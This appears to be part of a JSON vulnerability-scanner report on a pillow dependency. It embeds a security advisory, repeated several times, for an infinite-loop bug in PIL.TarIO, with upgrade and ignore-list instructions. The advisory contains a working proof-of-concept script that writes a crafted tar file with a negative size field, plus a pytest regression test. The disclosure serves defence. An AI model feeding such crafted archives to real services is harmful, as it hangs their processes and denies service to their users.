              "fullDescription": {
                "markdown": "### Summary\n`TarIO.__init__` does not check that a tar header's size field is positive. A crafted header with a negative size makes it seek backward onto itself. This causes an infinite loop that uses 100% CPU and never returns.\n\n### Details\n`TarIO.__init__` reads 512-byte tar headers one at a time, looking for a member with a given name. For each header it reads the size field and skips ahead to the next header:\n\n```python\nsize = int(s[124:135], 8)\n...\nself.fh.seek((size + 511) \u0026 (~511), io.SEEK_CUR)\n```\nThere is no check that size is zero or more. A tar header can set this field to a negative octal value. For size = -512, the seek offset comes out to exactly -512, which cancels the 512 bytes the loop had just read. The file position goes right back to where this loop step started.\n\nThe loop only stops on end of file or when a header name starts with a null byte. Neither happens, since the same header keeps showing up again. The loop never ends on its own.\n\n### Steps to reproduce\n\nThis uses Tests/images/hopper.tar, a normal file already in the Pillow test suite. It only changes the size field of the first header.\n\n```python\nfrom PIL import TarIO\n\nwith open(\"Tests/images/hopper.tar\", \"rb\") as f:\n    data = bytearray(f.read())\n\n# Set the size field (bytes 124 to 135) to a negative octal value.\n# Octal 1000 is 512, so this is size = -512.\ndata[124:135] = b\"  -00001000\"\n\nwith open(\"poisoned.tar\", \"wb\") as f:\n    f.write(data)\n\n# \"does-not-exist\" does not match the header name, so TarIO must\n# keep scanning. This call never returns.\nTarIO.TarIO(\"poisoned.tar\", \"does-not-exist\")\n```\n\nWe confirmed this with ps. The process sits at 98 to 100% CPU and never exits on its own. It only stops if killed from outside.\n\nA pytest version of this, using pytest-timeout so the test does not hang forever, is below. On the current code it fails with Failed: Timeout (\u003e3.0s) from pytest-timeout.\n\n```python\nfrom __future__ import annotations\n\nfrom pathlib import Path\n\nimport pytest\n\nfrom PIL import TarIO\n\nSOURCE_TAR = \"Tests/images/hopper.tar\"\n\n\n@pytest.mark.timeout(3)\ndef test_negative_size_field_does_not_hang(tmp_path: Path) -\u003e None:\n    with open(SOURCE_TAR, \"rb\") as f:\n        data = bytearray(f.read())\n\n    data[124:135] = b\"  -00001000\"  # octal 1000 = decimal 512, negated\n\n    poisoned_tar = tmp_path / \"poisoned.tar\"\n    poisoned_tar.write_bytes(data)\n\n    with pytest.raises((OSError, ValueError)):\n        with TarIO.TarIO(str(poisoned_tar), \"does-not-exist\"):\n            pass\n```\n### Impact\n\n- Availability: an attacker who can get a crafted tar file passed to TarIO.TarIO() can hang the process at full CPU with a file just over 512 bytes.\n- Confidentiality: none.\n- Integrity: none.\n- TarIO is a small helper class. It is not used by Image.open() and is not on the default path most Pillow users hit. An app has to call PIL.TarIO.TarIO(path, member_name) directly for this to matter, which some apps do to read an image out of a tar archive.",
                "text": "### Summary\n`TarIO.__init__` does not check that a tar header's size field is positive. A crafted header with a negative size makes it seek backward onto itself. This causes an infinite loop that uses 100% CPU and never returns.\n\n### Details\n`TarIO.__init__` reads 512-byte tar headers one at a time, looking for a member with a given name. For each header it reads the size field and skips ahead to the next header:\n\n```python\nsize = int(s[124:135], 8)\n...\nself.fh.seek((size + 511) \u0026 (~511), io.SEEK_CUR)\n```\nThere is no check that size is zero or more. A tar header can set this field to a negative octal value. For size = -512, the seek offset comes out to exactly -512, which cancels the 512 bytes the loop had just read. The file position goes right back to where this loop step started.\n\nThe loop only stops on end of file or when a header name starts with a null byte. Neither happens, since the same header keeps showing up again. The loop never ends on its own.\n\n### Steps to reproduce\n\nThis uses Tests/images/hopper.tar, a normal file already in the Pillow test suite. It only changes the size field of the first header.\n\n```python\nfrom PIL import TarIO\n\nwith open(\"Tests/images/hopper.tar\", \"rb\") as f:\n    data = bytearray(f.read())\n\n# Set the size field (bytes 124 to 135) to a negative octal value.\n# Octal 1000 is 512, so this is size = -512.\ndata[124:135] = b\"  -00001000\"\n\nwith open(\"poisoned.tar\", \"wb\") as f:\n    f.write(data)\n\n# \"does-not-exist\" does not match the header name, so TarIO must\n# keep scanning. This call never returns.\nTarIO.TarIO(\"poisoned.tar\", \"does-not-exist\")\n```\n\nWe confirmed this with ps. The process sits at 98 to 100% CPU and never exits on its own. It only stops if killed from outside.\n\nA pytest version of this, using pytest-timeout so the test does not hang forever, is below. On the current code it fails with Failed: Timeout (\u003e3.0s) from pytest-timeout.\n\n```python\nfrom __future__ import annotations\n\nfrom pathlib import Path\n\nimport pytest\n\nfrom PIL import TarIO\n\nSOURCE_TAR = \"Tests/images/hopper.tar\"\n\n\n@pytest.mark.timeout(3)\ndef test_negative_size_field_does_not_hang(tmp_path: Path) -\u003e None:\n    with open(SOURCE_TAR, \"rb\") as f:\n        data = bytearray(f.read())\n\n    data[124:135] = b\"  -00001000\"  # octal 1000 = decimal 512, negated\n\n    poisoned_tar = tmp_path / \"poisoned.tar\"\n    poisoned_tar.write_bytes(data)\n\n    with pytest.raises((OSError, ValueError)):\n        with TarIO.TarIO(str(poisoned_tar), \"does-not-exist\"):\n            pass\n```\n### Impact\n\n- Availability: an attacker who can get a crafted tar file passed to TarIO.TarIO() can hang the process at full CPU with a file just over 512 bytes.\n- Confidentiality: none.\n- Integrity: none.\n- TarIO is a small helper class. It is not used by Image.open() and is not on the default path most Pillow users hit. An app has to call PIL.TarIO.TarIO(path, member_name) directly for this to matter, which some apps do to read an image out of a tar archive."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-96642](https://osv.dev/CVE-2026-96642)**.\n\n## [GHSA-3j72-p6qg-6xp7](https://osv.dev/GHSA-3j72-p6qg-6xp7)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e `TarIO.__init__` does not check that a tar header's size field is positive. A crafted header with a negative size makes it seek backward onto itself. This causes an infinite loop that uses 100% CPU and never returns.\n\u003e \n\u003e ### Details\n\u003e `TarIO.__init__` reads 512-byte tar headers one at a time, looking for a member with a given name. For each header it reads the size field and skips ahead to the next header:\n\u003e \n\u003e ```python\n\u003e size = int(s[124:135], 8)\n\u003e ...\n\u003e self.fh.seek((size + 511) \u0026 (~511), io.SEEK_CUR)\n\u003e ```\n\u003e There is no check that size is zero or more. A tar header can set this field to a negative octal value. For size = -512, the seek offset comes out to exactly -512, which cancels the 512 bytes the loop had just read. The file position goes right back to where this loop step started.\n\u003e \n\u003e The loop only stops on end of file or when a header name starts with a null byte. Neither happens, since the same header keeps showing up again. The loop never ends on its own.\n\u003e \n\u003e ### Steps to reproduce\n\u003e \n\u003e This uses Tests/images/hopper.tar, a normal file already in the Pillow test suite. It only changes the size field of the first header.\n\u003e \n\u003e ```python\n\u003e from PIL import TarIO\n\u003e \n\u003e with open(\"Tests/images/hopper.tar\", \"rb\") as f:\n\u003e     data = bytearray(f.read())\n\u003e \n\u003e # Set the size field (bytes 124 to 135) to a negative octal value.\n\u003e # Octal 1000 is 512, so this is size = -512.\n\u003e data[124:135] = b\"  -00001000\"\n\u003e \n\u003e with open(\"poisoned.tar\", \"wb\") as f:\n\u003e     f.write(data)\n\u003e \n\u003e # \"does-not-exist\" does not match the header name, so TarIO must\n\u003e # keep scanning. This call never returns.\n\u003e TarIO.TarIO(\"poisoned.tar\", \"does-not-exist\")\n\u003e ```\n\u003e \n\u003e We confirmed this with ps. The process sits at 98 to 100% CPU and never exits on its own. It only stops if killed from outside.\n\u003e \n\u003e A pytest version of this, using pytest-timeout so the test does not hang forever, is below. On the current code it fails with Failed: Timeout (\u003e3.0s) from pytest-timeout.\n\u003e \n\u003e ```python\n\u003e from __future__ import annotations\n\u003e \n\u003e from pathlib import Path\n\u003e \n\u003e import pytest\n\u003e \n\u003e from PIL import TarIO\n\u003e \n\u003e SOURCE_TAR = \"Tests/images/hopper.tar\"\n\u003e \n\u003e \n\u003e @pytest.mark.timeout(3)\n\u003e def test_negative_size_field_does_not_hang(tmp_path: Path) -\u003e None:\n\u003e     with open(SOURCE_TAR, \"rb\") as f:\n\u003e         data = bytearray(f.read())\n\u003e \n\u003e     data[124:135] = b\"  -00001000\"  # octal 1000 = decimal 512, negated\n\u003e \n\u003e     poisoned_tar = tmp_path / \"poisoned.tar\"\n\u003e     poisoned_tar.write_bytes(data)\n\u003e \n\u003e     with pytest.raises((OSError, ValueError)):\n\u003e         with TarIO.TarIO(str(poisoned_tar), \"does-not-exist\"):\n\u003e             pass\n\u003e ```\n\u003e ### Impact\n\u003e \n\u003e - Availability: an attacker who can get a crafted tar file passed to TarIO.TarIO() can hang the process at full CPU with a file just over 512 bytes.\n\u003e - Confidentiality: none.\n\u003e - Integrity: none.\n\u003e - TarIO is a small helper class. It is not used by Image.open() and is not on the default path most Pillow users hit. An app has to call PIL.TarIO.TarIO(path, member_name) directly for this to matter, which some apps do to read an image out of a tar archive.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-3j72-p6qg-6xp7 | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-96642\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-96642](https://osv.dev/CVE-2026-96642)**.\n\n## [GHSA-3j72-p6qg-6xp7](https://osv.dev/GHSA-3j72-p6qg-6xp7)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e `TarIO.__init__` does not check that a tar header's size field is positive. A crafted header with a negative size makes it seek backward onto itself. This causes an infinite loop that uses 100% CPU and never returns.\n\u003e \n\u003e ### Details\n\u003e `TarIO.__init__` reads 512-byte tar headers one at a time, looking for a member with a given name. For each header it reads the size field and skips ahead to the next header:\n\u003e \n\u003e ```python\n\u003e size = int(s[124:135], 8)\n\u003e ...\n\u003e self.fh.seek((size + 511) \u0026 (~511), io.SEEK_CUR)\n\u003e ```\n\u003e There is no check that size is zero or more. A tar header can set this field to a negative octal value. For size = -512, the seek offset comes out to exactly -512, which cancels the 512 bytes the loop had just read. The file position goes right back to where this loop step started.\n\u003e \n\u003e The loop only stops on end of file or when a header name starts with a null byte. Neither happens, since the same header keeps showing up again. The loop never ends on its own.\n\u003e \n\u003e ### Steps to reproduce\n\u003e \n\u003e This uses Tests/images/hopper.tar, a normal file already in the Pillow test suite. It only changes the size field of the first header.\n\u003e \n\u003e ```python\n\u003e from PIL import TarIO\n\u003e \n\u003e with open(\"Tests/images/hopper.tar\", \"rb\") as f:\n\u003e     data = bytearray(f.read())\n\u003e \n\u003e # Set the size field (bytes 124 to 135) to a negative octal value.\n\u003e # Octal 1000 is 512, so this is size = -512.\n\u003e data[124:135] = b\"  -00001000\"\n\u003e \n\u003e with open(\"poisoned.tar\", \"wb\") as f:\n\u003e     f.write(data)\n\u003e \n\u003e # \"does-not-exist\" does not match the header name, so TarIO must\n\u003e # keep scanning. This call never returns.\n\u003e TarIO.TarIO(\"poisoned.tar\", \"does-not-exist\")\n\u003e ```\n\u003e \n\u003e We confirmed this with ps. The process sits at 98 to 100% CPU and never exits on its own. It only stops if killed from outside.\n\u003e \n\u003e A pytest version of this, using pytest-timeout so the test does not hang forever, is below. On the current code it fails with Failed: Timeout (\u003e3.0s) from pytest-timeout.\n\u003e \n\u003e ```python\n\u003e from __future__ import annotations\n\u003e \n\u003e from pathlib import Path\n\u003e \n\u003e import pytest\n\u003e \n\u003e from PIL import TarIO\n\u003e \n\u003e SOURCE_TAR = \"Tests/images/hopper.tar\"\n\u003e \n\u003e \n\u003e @pytest.mark.timeout(3)\n\u003e def test_negative_size_field_does_not_hang(tmp_path: Path) -\u003e None:\n\u003e     with open(SOURCE_TAR, \"rb\") as f:\n\u003e         data = bytearray(f.read())\n\u003e \n\u003e     data[124:135] = b\"  -00001000\"  # octal 1000 = decimal 512, negated\n\u003e \n\u003e     poisoned_tar = tmp_path / \"poisoned.tar\"\n\u003e     poisoned_tar.write_bytes(data)\n\u003e \n\u003e     with pytest.raises((OSError, ValueError)):\n\u003e         with TarIO.TarIO(str(poisoned_tar), \"does-not-exist\"):\n\u003e             pass\n\u003e ```\n\u003e ### Impact\n\u003e \n\u003e - Availability: an attacker who can get a crafted tar file passed to TarIO.TarIO() can hang the process at full CPU with a file just over 512 bytes.\n\u003e - Confidentiality: none.\n\u003e - Integrity: none.\n\u003e - TarIO is a small helper class. It is not used by Image.open() and is not on the default path most Pillow users hit. An app has to call PIL.TarIO.TarIO(path, member_name) directly for this to matter, which some apps do to read an image out of a tar archive.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-3j72-p6qg-6xp7 | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-96642\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
